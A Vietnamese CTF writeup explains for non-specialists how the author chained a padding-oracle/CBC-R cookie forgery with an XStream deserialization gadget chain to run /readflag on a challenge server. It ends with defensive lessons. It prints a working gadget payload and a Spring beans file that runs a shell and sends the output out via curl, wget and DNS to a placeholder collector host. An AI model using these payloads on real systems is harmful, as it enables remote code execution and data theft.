# Lạc Thái 48 — Kể lại một lần "phá két" trong cuộc thi an ninh mạng

> Đây là bản viết lại của một bài giải (writeup) cho một thử thách trong cuộc thi **Security Bootcamp 2026** (thể thức Tấn công & Phòng thủ). Mục tiêu của bản này là để **người không làm trong ngành an ninh mạng vẫn đọc và hiểu được** tôi đã làm gì, tại sao làm được, và bài học rút ra. Những đoạn kỹ thuật sâu vẫn được giữ lại nhưng luôn kèm giải thích bằng ngôn ngữ đời thường.

---

## Bối cảnh: thử thách là gì?

Ban tổ chức dựng lên một website giả lập (một "nhà hàng Thái") và giấu trong đó một **cờ (flag)** — một chuỗi bí mật dạng `SBC{...}`. Nhiệm vụ của người chơi là tìm cách "đột nhập" vào máy chủ để đọc được chuỗi bí mật đó. Ai đọc được flag trước và nộp lên thì được điểm.

Điểm mấu chốt: trên máy chủ có sẵn một lệnh tên là `/readflag`. Chỉ cần **chạy được lệnh này trên máy chủ của họ**, nó sẽ in ra flag. Vấn đề là website không cho phép người dùng bình thường chạy lệnh gì cả. Vậy nên toàn bộ thử thách là: *làm sao lừa được máy chủ tự chạy lệnh `/readflag` giúp mình, rồi gửi kết quả về cho mình.*

Thử thách này trị giá **10.000 điểm** — mức điểm cao, nghĩa là nó khó.

---

## Tóm tắt trong một đoạn 

Khi bạn vào website, nó phát cho bạn một tấm "vé giữ chỗ" (cookie phiên đăng nhập) đã bị **mã hóa**. Tôi phát hiện ra cách máy chủ kiểm tra tấm vé này có một **lỗ hổng cổ điển** cho phép tôi vừa **giải mã** nội dung tấm vé, vừa **tự chế ra tấm vé giả** mà máy chủ vẫn tin — dù tôi **không hề biết chìa khóa mã hóa**.

Khi đã tự viết được nội dung tấm vé, tôi nhét vào đó một "mệnh lệnh ngụy trang" khai thác một lỗ hổng thứ hai trong cách máy chủ đọc dữ liệu. Chuỗi lỗ hổng này khiến máy chủ **tự động tải một tập tin lệnh từ máy của tôi về và thi hành nó**, dẫn đến việc nó chạy `/readflag` và **gửi flag ra ngoài cho tôi**.

Nói ngắn gọn: tôi đã biến một "tấm vé giữ chỗ" thành một "chiếc chìa khóa vạn năng" điều khiển máy chủ từ xa.

---

## Phần 1 — Quan sát ban đầu (Recon)

Việc đầu tiên khi tấn công một hệ thống là **quan sát**, giống như một tên trộm đi vòng quanh ngôi nhà xem cửa nẻo thế nào trước khi hành động.

Khi truy cập trang chủ, website đưa cho tôi một tấm vé (cookie) tên là `session`, trông như một mớ ký tự vô nghĩa dài loằng ngoằng:

```
Set-Cookie: session=zksM04+9ku6SfIqGnEx6WYWj+KXcnvUim/VhCxfTYvUZIEf...
```

Có một trang tên `/dashboard` (bảng điều khiển) hiện ra bạn đang là ai:

```
→ Welcome back, guest (role=user)     ("Chào mừng trở lại, khách — vai trò: người dùng")
```

**Điều tôi để ý:** khi giải mã tấm vé đó từ dạng "Base64" (một cách viết dữ liệu phổ biến) sang dữ liệu thô, nó dài đúng **176 byte, chia hết cho 16**. Con số chia hết cho 16 là một "dấu vân tay" đặc trưng của một loại mã hóa cụ thể tên là **AES kiểu CBC** — loại mã hóa chia dữ liệu thành từng khối (block) 16 byte một.

> **Hiểu nôm na:** Tấm vé của bạn không phải chuỗi ngẫu nhiên. Nó là một tài liệu đã được **bỏ vào két sắt và khóa lại**. Máy chủ giữ chìa. Mỗi khi bạn đưa vé, máy chủ mở két, đọc xem bạn là ai, rồi phục vụ.

Câu chuyện của thử thách ("bằng cách nào đó đơn hàng của bạn đã bị mã hóa") cùng việc website không hề bắt đăng nhập gợi ý rằng: **toàn bộ danh tính của tôi nằm gọn trong tấm vé đã mã hóa này.** Nếu tôi can thiệp được vào cái két đó, tôi kiểm soát được mình là ai.

---

## Phần 2 — Lỗ hổng thứ nhất: "Padding Oracle" (máy chủ vô tình mách nước)

Đây là phần cốt lõi và cũng thú vị nhất, nên tôi sẽ giải thích kỹ.

### Vấn đề của máy chủ

Khi tôi cố tình **sửa lung tung** vài ký tự trong tấm vé rồi gửi lại, máy chủ trả về **ba loại phản hồi khác nhau** tùy tôi sửa vào đâu:

| Tôi làm gì với tấm vé | Máy chủ trả lời | Nghĩa là |
|---|---|---|
| Sửa nhẹ phần cuối | `403` — "token padding is invalid" | "Phần đệm cuối sai định dạng" |
| Sửa phần đầu/giữa | `500` — "could not parse session state" | "Đệm thì đúng, nhưng nội dung đọc không hiểu" |
| Làm sai độ dài | `400` — "malformed token" | "Vé sai kích cỡ" |
| Để nguyên | `200` — "Welcome back, guest" | "Ổn, mời vào" |

Vấn đề nằm ở chỗ máy chủ **quá thật thà**. Nó phân biệt rõ ràng giữa "phần đệm cuối sai" (403) và "phần đệm cuối đúng nhưng nội dung hỏng" (500).

### Vì sao đó là thảm họa

Khi mã hóa CBC, dữ liệu phải được "độn" thêm vài byte ở cuối cho đủ khối 16 byte — gọi là **padding** (phần đệm), theo một quy tắc chuẩn tên PKCS#7. Khi giải mã, máy chủ luôn kiểm tra phần đệm này có đúng quy tắc không.

Cái bẫy là: **máy chủ nói cho tôi biết phần đệm đúng hay sai.** Đây gọi là một **"Padding Oracle"** — hiểu nôm na là *"một nhà tiên tri vô tình tiết lộ bí mật"*.

> **Ví dụ dễ hình dung:** Tưởng tượng một cái két có bàn phím nhập mật khẩu. Bình thường bạn phải nhập đúng cả dãy số mới mở được. Nhưng cái két này có một lỗi: **mỗi khi bạn nhập đúng một chữ số, đèn xanh nhấp nháy; sai thì đèn đỏ.** Chỉ cần vậy thôi, bạn không cần biết mật khẩu — bạn thử từng chữ số, canh đèn, và dò ra toàn bộ dãy số chỉ trong ít phút.
>
> "Padding Oracle" chính xác là như vậy. Máy chủ trả `403` = "đèn đỏ", còn bất kỳ câu trả lời nào khác = "đèn xanh". Bằng cách gửi hàng nghìn tấm vé sửa đổi và quan sát màu đèn, tôi có thể **giải mã từng byte một** mà không cần chìa khóa của máy chủ.

### Tối ưu tốc độ

Dò từng byte nghĩa là phải gửi **rất nhiều** yêu cầu tới máy chủ. Ban đầu công cụ của tôi chỉ gửi được ~16 yêu cầu mỗi giây — quá chậm. Tôi viết lại phần kết nối mạng để giữ đường truyền mở liên tục (thay vì mở/đóng liên tục), nâng lên **~760 yêu cầu mỗi giây**. Tôi cũng lưu lại tiến độ để nếu bị gián đoạn thì chạy tiếp được, không phải làm lại từ đầu.

---

## Phần 3 — Không chỉ đọc trộm, mà còn giả mạo (kỹ thuật CBC-R)

Lỗ hổng ở trên không chỉ giúp tôi **đọc** nội dung tấm vé, mà — nhờ một tính chất toán học của kiểu mã hóa CBC — còn cho phép tôi **tự chế ra tấm vé mới** chứa bất kỳ nội dung nào tôi muốn, mà máy chủ vẫn giải mã ra đúng như thế. Kỹ thuật này gọi là **CBC-R**.

Trước tiên, tôi giải mã tấm vé thật để xem bên trong có gì. Kết quả là một tài liệu có cấu trúc như sau:

```xml
<com.challenge.padthai.Session>
  <username>guest</username>       <!-- tên: khách -->
  <role>user</role>               <!-- vai trò: người dùng -->
  <issuedAt>1789025858296</issuedAt>  <!-- thời điểm cấp vé -->
</com.challenge.padthai.Session>
```

À, thì ra bên trong tấm vé là một tài liệu mô tả "tôi là ai". Nó được viết bằng một công nghệ tên **XStream** (một cách để lưu các đối tượng phần mềm dưới dạng văn bản XML).

**Phép thử đầu tiên:** Tôi tự chế một tấm vé ghi `role=admin` (vai trò quản trị viên) thay vì `user`. Gửi lên, máy chủ đáp lại:

```
Welcome back, admin (role=admin)
```

Thành công! Tôi vừa tự phong mình làm quản trị viên mà không cần biết mật khẩu hay chìa khóa. Nhưng đổi vai trò chỉ đổi được lời chào — chưa phải flag. Phần thưởng thật sự lớn hơn nhiều: **tôi có thể viết bất kỳ nội dung nào vào tấm vé, và máy chủ sẽ ngoan ngoãn "đọc" nó.**

---

## Phần 4 — Lỗ hổng thứ hai: máy chủ đọc dữ liệu quá cả tin

Khi máy chủ nhận tấm vé, nó dùng công nghệ **XStream** để "dựng lại" tài liệu XML thành các đối tượng phần mềm sống động trong bộ nhớ. Quá trình này gọi là **deserialization** (tạm dịch: "tái dựng đối tượng từ dữ liệu").

Vấn đề: quá trình tái dựng này rất mạnh — nó có thể tạo ra gần như **bất kỳ loại đối tượng nào** mà tài liệu yêu cầu. Nếu kẻ tấn công kiểm soát được nội dung tài liệu (mà tôi thì kiểm soát được rồi, nhờ Phần 3), thì đây là một lỗ hổng nghiêm trọng.

Máy chủ có cố gắng phòng thủ bằng một **"danh sách đen" (blocklist)** — tức là một danh sách các loại đối tượng nguy hiểm bị cấm. Tôi thử liệt kê xem cái gì bị cấm, cái gì được phép:

| Loại đối tượng | Kết quả |
|---|---|
| `ProcessBuilder`, `Runtime` (những thứ chạy được lệnh hệ thống) | ❌ Bị cấm |
| `InvokerTransformer` (thứ *gọi* được một hàm bất kỳ) | ❌ Bị cấm |
| `InstantiateFactory` (thứ *tạo mới* một đối tượng) | ✅ Được phép |
| `ClassPathXmlApplicationContext` (của Spring) | ✅ Được phép |
| `LazyMap`, `TiedMapEntry` (các cấu trúc dữ liệu hỗ trợ) | ✅ Được phép |

> **Bài học phòng thủ quan trọng ở đây:** Dùng "danh sách đen" (liệt kê cái gì bị cấm) là một sai lầm kinh điển. Vì kẻ tấn công chỉ cần tìm **một** thứ nguy hiểm mà bạn *quên* cho vào danh sách cấm. Cách đúng phải là "danh sách trắng" (allowlist) — chỉ cho phép đúng vài thứ vô hại cần thiết, còn lại **cấm hết**.

**Khe hở then chốt:** Máy chủ cấm những thứ *gọi hàm* để làm việc xấu, nhưng lại cho phép những thứ *tạo mới đối tượng*. Nghe thì có vẻ vô hại — "chỉ tạo đối tượng thôi mà" — nhưng đó chính là kẽ hở tôi khai thác.

---

## Phần 5 — Những ngõ cụt (những cách tôi đã thử và thất bại)

Trước khi tìm ra cách đúng, tôi thử nhiều hướng khác và đều thất bại. Ghi lại đây để người sau đỡ mất công:

- **Thử tấn công XXE:** một kiểu tấn công qua XML — nhưng thành phần đọc XML của máy chủ từ chối mọi mánh khóe kiểu này.
- **Thử vài chuỗi khai thác quen thuộc:** đều va phải "danh sách đen" hoặc va phải các cơ chế bảo vệ mới của Java phiên bản 21 (phiên bản máy chủ đang chạy) khiến chúng vô hiệu.
- **Thử nhét thẳng một "khối mã độc" khổng lồ vào tấm vé:** về lý thuyết được, nhưng khối này quá lớn (~3,5 KB), mà mỗi ký tự tôi giả mạo trong vé đều tốn thời gian dò "đèn xanh đèn đỏ". Quá chậm và mong manh.

Những thất bại này định hình chiến lược cuối cùng: tôi cần một cách khai thác **gọn nhẹ** (tấm vé càng ngắn càng tốt) và chỉ dùng những thứ **không nằm trong danh sách cấm**.

---

## Phần 6 — Cú chốt: dùng "hàm khởi tạo" làm vũ khí

Vì máy chủ chỉ cho phép tôi *tạo mới đối tượng* chứ không cho *gọi hàm*, tôi cần tìm một loại đối tượng mà **chính hành động tạo ra nó đã là một hành động nguy hiểm**.

Và có một ứng viên hoàn hảo: `ClassPathXmlApplicationContext` (một thành phần của khung phần mềm Spring, rất phổ biến trong ứng dụng Java). Đặc điểm chí mạng của nó: **ngay khi được tạo ra với một địa chỉ web, nó sẽ tự động đi tải tập tin cấu hình từ địa chỉ đó về và thi hành theo.**

> **Hiểu nôm na:** Bình thường "tạo một đối tượng" giống như đặt một cái ghế vào phòng — vô hại. Nhưng cái "đối tượng" đặc biệt này giống như một chú robot: **vừa lắp ráp xong là nó lập tức chạy đi lấy một tờ giấy ghi hướng dẫn từ địa chỉ bạn đưa, rồi làm y hệt những gì tờ giấy ghi.** Nếu tờ giấy đó do tôi viết, thì tôi điều khiển được robot.

Để "lắp ráp" được chú robot này thông qua các thành phần không bị cấm, tôi ghép nối một chuỗi các đối tượng được phép (`TiedMapEntry` → `LazyMap` → `FactoryTransformer` → `InstantiateFactory`). Chuỗi này được kích hoạt tự động vì máy chủ có thói quen "in tấm vé ra màn hình" — chính hành động đó khởi động cả dây chuyền.

**Nội dung tấm vé giả tôi tạo ra** (chỉ dẫn máy chủ tạo "chú robot" và đưa cho nó địa chỉ web của tôi):

```xml
<org.apache.commons.collections4.keyvalue.TiedMapEntry>
 <map class="org.apache.commons.collections4.map.LazyMap" serialization="custom">
  <org.apache.commons.collections4.map.LazyMap>
   <default>
    <factory class="org.apache.commons.collections4.functors.FactoryTransformer">
     <iFactory class="org.apache.commons.collections4.functors.InstantiateFactory">
      <iClassToInstantiate>org.springframework.context.support.ClassPathXmlApplicationContext</iClassToInstantiate>
      <iParamTypes><java-class>java.lang.String</java-class></iParamTypes>
      <iArgs><string>http://webhook.site/&lt;địa-chỉ-của-tôi&gt;</string></iArgs>
     </iFactory>
    </factory>
   </default>
   <map class="java.util.HashMap"/>
  </org.apache.commons.collections4.map.LazyMap>
 </map>
 <key class="string">k</key>
</org.apache.commons.collections4.keyvalue.TiedMapEntry>
```

> **Mẹo tiết kiệm thời gian:** Vì mỗi lần giả mạo một tấm vé cho máy chủ thật đều tốn vài phút "dò đèn", tôi đã **tải toàn bộ các thư viện phần mềm về máy mình, dựng lại một bản sao của máy chủ**, và thử đi thử lại đoạn khai thác trên bản sao đó cho đến khi chạy hoàn hảo. *Chỉ khi chắc chắn 100%*, tôi mới bỏ công giả mạo **một tấm vé duy nhất** cho máy chủ thật. Không phí một phát đạn nào.

---

## Phần 7 — "Tờ giấy hướng dẫn" và cách lấy flag ra ngoài

Nhớ chú robot ở trên chứ? Khi được tạo ra, nó sẽ tải một tờ giấy hướng dẫn từ địa chỉ web của tôi. Vậy tôi cần chuẩn bị sẵn tờ giấy đó.

Tôi dùng một dịch vụ miễn phí tên **webhook.site** (cho phép tạo một địa chỉ web tạm và tùy chỉnh nội dung nó trả về). Tờ giấy hướng dẫn tôi đặt ở đó ra lệnh cho máy chủ: **chạy `/readflag`, rồi gửi kết quả về cho tôi qua ba đường khác nhau** (để chắc chắn ít nhất một đường thành công):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans ...>
  <bean class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>/bin/sh</value>
        <value>-c</value>
        <value>D=$(/readflag 2>&amp;1 | base64 | tr -d "\n");
               curl -s "http://COLLAB/f?d=$D";
               wget -q -O /dev/null "http://COLLAB/w?d=$D";
               getent hosts "$(echo $D|cut -c1-40).COLLAB"</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

Diễn giải dòng lệnh trên: *"Chạy `/readflag`, mã hóa kết quả cho gọn, rồi gửi nó về địa chỉ của tôi qua 3 kênh: một qua `curl`, một qua `wget`, và một qua tra cứu tên miền `DNS`."*

**Tại sao phải tách làm hai bước** (tấm vé chỉ chứa địa chỉ, còn lệnh thật để riêng trên webhook)? Vì nếu nhét toàn bộ đoạn lệnh dài này thẳng vào tấm vé, tôi sẽ phải giả mạo một tấm vé cực dài — tốn hàng trăm lần "dò đèn", quá lâu. Cách này giữ tấm vé cực ngắn (chỉ chứa một đường link), còn phần việc nặng để máy chủ tự đi lấy về.

---

## Phần 8 — Bắt được flag

Tôi gửi tấm vé đã giả mạo lên máy chủ. Nó đáp lại:

```
HTTP 200  Session restored: k=org.springframework.context.support.ClassPathXmlApplicationContext@d795a9b,
          started on Thu Sep 10 10:44:05 UTC 2026
```

Dòng chữ "ClassPathXmlApplicationContext... started" xác nhận **chú robot đã được lắp ráp và khởi động trên máy chủ** — tức là nó đã đi tải tờ giấy hướng dẫn của tôi và thi hành.

Kiểm tra bảng ghi nhận (log) tại địa chỉ web của tôi, tôi thấy một yêu cầu gửi đến **từ chính địa chỉ IP của máy chủ thử thách** (`103.70.12.91`):

```
GET /f?d=U0JDe3A0ZGQxb...
```

Đoạn `U0JDe3A0ZGQxb...` chính là flag đã được mã hóa gọn. Giải mã ra:

```
SBC{p4dd1ng_0r4cl3_...}
```

🎉 **Flag đã về tay.** Máy chủ đã tự tay chạy `/readflag` và gửi bí mật cho tôi.

---

## Phần 9 — Bài học phòng thủ (dành cho người viết phần mềm)

Đây là phần quan trọng nhất về mặt thực tiễn. Nếu bạn đang xây dựng hệ thống, đây là những lỗi cần tránh:

1. **Mã hóa thôi là chưa đủ — phải kèm "niêm phong chống giả mạo".** Cả hệ thống sụp đổ vì máy chủ tin tưởng một tấm vé đã mã hóa mà không kiểm tra xem nó có bị sửa đổi hay không. Giải pháp: dùng cơ chế vừa mã hóa vừa "niêm phong" (ví dụ AES-GCM, hoặc "mã hóa rồi ký"). Chỉ cần kiểm tra niêm phong *trước khi* giải mã là toàn bộ lỗ hổng "padding oracle" bị vô hiệu.

2. **Đừng để thông báo lỗi tiết lộ bí mật.** Việc máy chủ phân biệt "đệm sai" và "nội dung hỏng" chính là "ngọn đèn" mách nước cho tôi. Hãy trả về **cùng một thông báo lỗi chung chung** cho mọi trường hợp.

3. **Dùng "danh sách trắng", không dùng "danh sách đen".** Chỉ cho phép đúng những thứ vô hại cần thiết, cấm tất cả phần còn lại. Danh sách đen luôn có kẽ hở bạn quên.

4. **Đừng "tái dựng đối tượng" từ dữ liệu do người dùng kiểm soát.** Với dữ liệu phiên (session), hãy dùng định dạng dữ liệu đơn giản, có kiểm soát chặt chẽ (ví dụ JSON với cấu trúc cố định) thay vì các công nghệ tái dựng đối tượng đầy quyền năng như XStream.

---

## Phụ lục — Công cụ đã dùng

- **`padthai_cookie.py`** — công cụ tôi tự viết để thực hiện việc "dò đèn" (padding oracle) và giả mạo tấm vé (CBC-R), có tối ưu tốc độ và lưu tiến độ.
- **Burp (qua công cụ trung gian MCP)** — dùng để quan sát, gửi thử các yêu cầu, và tạo địa chỉ thu thập dữ liệu.
- **Bản sao máy chủ dựng trên máy cá nhân** — để thử nghiệm đoạn khai thác thoải mái mà không tốn thời gian trên máy chủ thật.
- **webhook.site** — dịch vụ web tạm để phục vụ "tờ giấy hướng dẫn" và ghi nhận flag gửi về.

---

### Sơ đồ tổng thể của cuộc tấn công

```
Lỗ hổng 1 (dò đèn) → giải mã & giả mạo tấm vé
        ↓
Nhét "mệnh lệnh ngụy trang" vào tấm vé (Lỗ hổng 2)
        ↓
Máy chủ tạo "chú robot" ClassPathXmlApplicationContext
        ↓
Robot tải "tờ giấy hướng dẫn" từ webhook của tôi
        ↓
Máy chủ chạy /readflag và gửi flag về cho tôi
        ↓
        🏁 FLAG
```
